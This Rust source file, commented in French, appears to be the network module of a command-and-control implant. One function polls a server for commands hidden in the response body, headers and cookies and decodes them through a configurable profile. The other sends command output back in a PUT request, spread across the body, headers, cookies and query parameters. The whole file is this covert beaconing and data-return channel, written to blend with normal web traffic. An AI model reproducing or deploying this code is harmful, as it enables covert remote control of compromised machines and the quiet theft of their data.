use reqwest::Client;
use std::collections::HashMap;
use uuid::Uuid;
use crate::models::{Command, CommandResponse};
use crate::profile::{Profile, RequestData};

pub async fn get_command(client: &Client, base_url: &str, profile: &Profile, route: &str) -> Option<Command> {
    let url = format!("{}{}", base_url, route);
    let resp = client.get(&url).send().await.ok()?;

    if !resp.status().is_success() {
        return None;
    }

    // Extraire les headers et cookies avant de consommer
    let mut headers = HashMap::new();
    let mut cookies = HashMap::new();

    for (key, value) in resp.headers() {
        if let Ok(val) = value.to_str() {
            let key_str = key.to_string();
            if key_str.to_lowercase() == "set-cookie" {
                // Parser le Set-Cookie: "name=value; Path=/; ..."
                if let Some(cookie_part) = val.split(';').next() {
                    if let Some((name, val)) = cookie_part.split_once('=') {
                        cookies.insert(name.trim().to_string(), val.trim().to_string());
                    }
                }
            } else {
                headers.insert(key_str, val.to_string());
            }
        }
    }

    // Récupérer le body en tant que texte et parser manuellement
    let body_text = resp.text().await.ok()?;
    let body: HashMap<String, String> = serde_json::from_str(&body_text).ok()?;

    // Créer une RequestData avec body + headers + cookies
    let request_data = RequestData {
        body: body.clone(),
        headers,
        cookies,
    };

    // Décoder avec le profile "server"
    let command_text = profile.decode(&request_data).ok()?;

    // Extraire l'ID de la commande depuis le body
    let command_id_field = profile.config.command_id.as_ref()?.field.as_str();
    let id_str = body.get(command_id_field)?;
    let id = Uuid::parse_str(id_str).ok()?;

    Some(Command { id, text: command_text })
}

pub async fn send_response(
    client: &Client,
    base_url: &str,
    profile: &Profile,
    command_id: Uuid,
    response: &CommandResponse,
    response_route: &str,
) -> bool {
    let payload = profile.encode(&response.output, command_id);

    let url = format!("{}{}", base_url, response_route);
    let mut req = client.put(&url);

    // Envoyer le body en JSON
    req = req.json(&payload.body);

    // Ajouter les headers encodés
    for (key, value) in &payload.headers {
        req = req.header(key, value);
    }

    // Ajouter les cookies encodés dans l'en-tête Cookie
    if !payload.cookies.is_empty() {
        let cookies: Vec<String> = payload.cookies
            .iter()
            .map(|(k, v)| format!("{}={}", k, v))
            .collect();
        req = req.header("Cookie", cookies.join("; "));
    }

    // Ajouter les query parameters
    for (key, value) in &payload.query {
        req = req.query(&[(key.as_str(), value.as_str())]);
    }

    match req.send().await {
        Ok(resp) => resp.status().is_success(),
        Err(_) => false,
    }
}